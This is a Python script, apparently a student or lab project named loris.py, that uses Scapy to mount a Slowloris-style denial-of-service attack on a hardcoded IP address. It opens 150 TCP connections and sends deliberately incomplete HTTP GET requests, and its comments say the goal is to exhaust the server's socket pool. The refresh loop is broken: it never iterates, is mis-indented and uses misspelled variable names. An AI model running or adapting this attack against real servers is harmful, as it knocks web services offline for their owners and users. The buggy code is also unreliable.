#!/usr/bin/env python

# Imports
from scapy.all import *
from request_http import *
import time
import random

# TITLE: loris.py
# AUTHORS: Matheus Augusto da Silva; Alessandro Montaldo
# This block will call over the function in request_http which we defined earlier
# and also have a few variables and lists containing data pertaining to each
# individual connection

# Since Scapy goes a little bit more lower-level than the regular sockets library
# for python ( we are managing TCP connections without a logical layer of abstraction )
# some data structures should be set in place such that TCP rules are followed:
# - Sequence and Acknowledgment numbers should be watched closely
# - We probably can't check the current TCP connection's livelihood without sending another packet,
#   so we'll take a more practical approach and periodically refresh connections.
# - Connections will be refreshed by sending a random integer in the HTTP Header
# - GET Requests are incomplete (we need to send two end-of-line characters to finish
#   a request) , only one of the end-of-line characters will be sent
# - If requests are sent unfinished, the server may assume we have a slow Internet
#   connection or a problem has happened, it will trigger a timer and wait a bit before
#   killing the socket
# - If we keep opening a big number of connections the socket pool on the server
#   side may be exhausted, effectively DoS'ing the HTTP service

def main():
    ip_address = "35.204.165.14"
    #ip_address = "asdkappadue.it"
    port = random.randint(1024,6000) # 4213 
    ip = IP(dst=ip_address)
    server_port=80
    list_size = 150
    port_list = list(range(port, port + list_size))

    seqAckList = []
    seqNumList = []

    # The data structures are bound to be changed somewhat in the final version
    for _ in range(list_size):
        seqNumList.append(1) #init of seq numb
        seqAckList.append(1) #init of ack numb

    print(port_list)

    # This will initialise each individual TCP socket
    for p in range(list_size):
        seqNumList[p], seqAckList[p] = httpRequest(ip_address,port_list[p], seqNumList[p])
    
    # This treatment will probably be changed later
    for n in range(0):
	for p in range(list_size):
            ACK = ip/TCP(sport=p,
                         dport=server_port,
                         flags="A",
                         seq=seqNumList[p],
                         ack=seqAckList[p])
            MYNUMBER=ACK/"X-a: {}\r\r".format(random.randint(1,5000)).encode("utf-8")
            answerMyNumber = sr1(MYNUMBER)
            seqNumlist[p]+= 1
            seqAcklist[p] = answerMyNumber.seq
        
if __name__== "__main__":
    main()

